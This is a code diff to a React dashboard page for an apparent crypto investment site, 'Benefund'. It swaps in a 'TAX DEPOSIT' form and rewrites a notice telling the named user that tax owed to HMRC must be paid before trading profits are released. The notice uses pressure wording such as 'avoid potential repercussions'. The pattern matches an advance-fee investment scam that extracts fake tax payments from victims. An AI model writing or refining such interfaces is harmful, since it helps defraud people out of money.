@@ -9,7 +9,7 @@ import { Dropdown, Nav, Tab } from "react-bootstrap";
 import { ThemeContext } from "../../../context/ThemeContext";
 import BalanceCardSlider from "./Dashboard/BalanceCardSlider";
 //import MorrisDonught from './Dashboard/MorrisDonught';
-import OrderForm from "./Dashboard/OrderForm";
+import TaxOrderForm from "./Dashboard/TaxOrderForm";
 //import ServerStatusBar from './Dashboard/ServerStatusBar';
 import { LtcIcon, BtcIcon, XtzIcon, EthIcon } from "./SvgIcon";
 
@@ -40,6 +40,7 @@ const HomeTax = () => {
   const [currentEthPrice, setCurrentEthPrice] = useState(null);
   const [priceDirection, setPriceDirection] = useState(""); // "up", "down", or ""
   const [showDisclaimer, setShowDisclaimer] = useState(false);
+  const [tax, setTax] = useState(0);
 
   function toggleDisclaimer() {
     setShowDisclaimer(!showDisclaimer);
@@ -82,6 +83,9 @@ const HomeTax = () => {
           for (let i = 0; i < data.length; i++) {
             sumDeposits += data[i]?.initial_investment;
             sumReturns += data[i]?.total_return;
+            if (data[i].status === "Deposit Paid") {
+              setTax(data[i].tax_amount);
+            }
           }
           setInvestments(data);
           setTotalDeposits(sumDeposits);
@@ -199,25 +203,43 @@ const HomeTax = () => {
                         </h2>
 
                         <p className="congrats-message">
-                          Due to profits being successfully traded by Benefund,
-                          a sum of £{totalReturns}.00, Tax is due to HMRC.
-                          Failure to complete payment may lead to further action
-                          being taken.{" "}
+                          Following the successful trading activities managed by
+                          Benefund, it has been determined that a tax obligation
+                          of £{tax}.00 is owed to HMRC. It is imperative that
+                          this tax payment is promptly settled to avoid
+                          potential repercussions.{" "}
                           {user.gender === "male"
                             ? "Mr."
                             : user.gender === "female"
                             ? "Mrs."
                             : "Mr./Mrs."}{" "}
-                          {user.last_name} is responsible to ensure that tax
-                          payment is made before receiving profits. Tax return
-                          is available if it's the payee's first trade. Profits
-                          will be released into{" "}
+                          {user.last_name} holds the responsibility for ensuring
+                          the timely submission of this payment before receiving
+                          the profits. In the event that this marks the initial
+                          trade,{" "}
                           {user.gender === "male"
                             ? "Mr."
                             : user.gender === "female"
                             ? "Mrs."
                             : "Mr./Mrs."}{" "}
-                          {user.last_name}'s account once payment is made.
+                          {user.last_name} may be eligible to file a tax return.
+                          Once the tax payment is processed, the profits will be
+                          promptly released into{" "}
+                          {user.gender === "male"
+                            ? "Mr."
+                            : user.gender === "female"
+                            ? "Mrs."
+                            : "Mr./Mrs."}{" "}
+                          {user.last_name}'s designated account. It is advised
+                          that{" "}
+                          {user.gender === "male"
+                            ? "Mr."
+                            : user.gender === "female"
+                            ? "Mrs."
+                            : "Mr./Mrs."}{" "}
+                          {user.last_name} takes swift action to fulfill this
+                          obligation to HMRC to prevent any further
+                          complications.
                           <Link
                             className="btn btn-primary w-75 mt-4 d-block"
                             onClick={toggleDisclaimer}
@@ -355,7 +377,7 @@ const HomeTax = () => {
                               eventKey="Navbuy"
                               type="button"
                             >
-                              IMO DEPOSIT
+                              TAX DEPOSIT
                             </Nav.Link>
                             {/* <Nav.Link as="button" className="nav-link" eventKey="Navsell"  type="button">sell</Nav.Link> */}
                           </Nav>
@@ -378,7 +400,7 @@ const HomeTax = () => {
                                       color: "#9568ff",
                                     }}
                                   >
-                                    pending
+                                    Pending
                                   </span>
                                   {/* <Nav.Link as="button"  eventKey="Navbuymarket"  type="button"  >market order</Nav.Link>
 																	<Nav.Link as="button"  eventKey="Navbuylimit"  type="button" >limit order</Nav.Link> */}
@@ -409,95 +431,12 @@ const HomeTax = () => {
                                 <Tab.Pane eventKey="Navbuylimit"></Tab.Pane>
                               </Tab.Content>
                               <div className="sell-element">
-                                <OrderForm
-                                  investments={investments}
-                                  balance={totalReturns + totalDeposits}
-                                />
+                                <TaxOrderForm balance={tax} />
                               </div>
                             </Tab.Container>
                           </Tab.Pane>
                         </Tab.Content>
                       </div>
-                    </Tab.Container>
-                  </div>
-                </div>
-              </div>
-              <div className="col-xl-12 col-sm-6">
-                <div className="card">
-                  <div className="card-header py-2">
-                    <h2 className="heading">
-                      Order Book <span>(USDT/ETH)</span>
-                    </h2>
-                  </div>
-                  <div className="card-body pt-0 pb-3 px-2">
-                    <Tab.Container defaultActiveKey="Openorder">
-                      <nav className="buy-sell style-1">
-                        <Nav className=" nav-tabs" id="nav-tab1" role="tablist">
-                          <Nav.Link
-                            as="button"
-                            className="nav-link "
-                            eventKey="Openorder"
-                            type="button"
-                          >
-                            Open Orders
-                          </Nav.Link>
-                          {/* <Nav.Link as="button" className="nav-link" eventKey="Orderhistory" type="button" >Order History</Nav.Link> */}
-                        </Nav>
-                      </nav>
-                      <Tab.Content style={{ overflow: "scroll" }}>
-                        <Tab.Pane eventKey="Openorder">
-                          <div className="list-row-head">
-                            <span>Price</span>
-                            <span>Size</span>
-                            <span className="text-end">Total</span>
-                          </div>
-                          <div className="list-table danger">
-                            {/* Display bids */}
-                            {orderBook.bids.map((bid, i) => (
-                              <div className="list-row" key={i}>
-                                <span>{bid.price.toFixed(2)}</span>
-                                <span>{bid.size.toFixed(6)}</span>
-                                <span className="text-end">
-                                  {bid.total.toFixed(6)}
-                                </span>
-                                <div className="bg-layer"></div>
-                              </div>
-                            ))}
-                          </div>
-                          {/* Dynamic price and direction indicator */}
-                          <div className="list-bottom-info">
-                            <h6
-                              className={
-                                priceDirection === "up"
-                                  ? "text-success"
-                                  : "text-danger"
-                              }
-                              mb-0
-                            >
-                              {currentEthPrice
-                                ? currentEthPrice.toFixed(2)
-                                : "Loading..."}{" "}
-                              <i
-                                className={`fa-solid fa-caret-${priceDirection}`}
-                              ></i>
-                            </h6>
-                          </div>
-                          <div className="list-table success">
-                            {/* Display asks */}
-                            {orderBook.asks.map((ask, i) => (
-                              <div className="list-row" key={i}>
-                                <span>{ask.price.toFixed(2)}</span>
-                                <span>{ask.size.toFixed(6)}</span>
-                                <span className="text-end">
-                                  {ask.total.toFixed(6)}
-                                </span>
-                                <div className="bg-layer"></div>
-                              </div>
-                            ))}
-                          </div>
-                        </Tab.Pane>
-                        {/* Implementation for Order History remains similar */}
-                      </Tab.Content>
                     </Tab.Container>
                   </div>
                 </div>
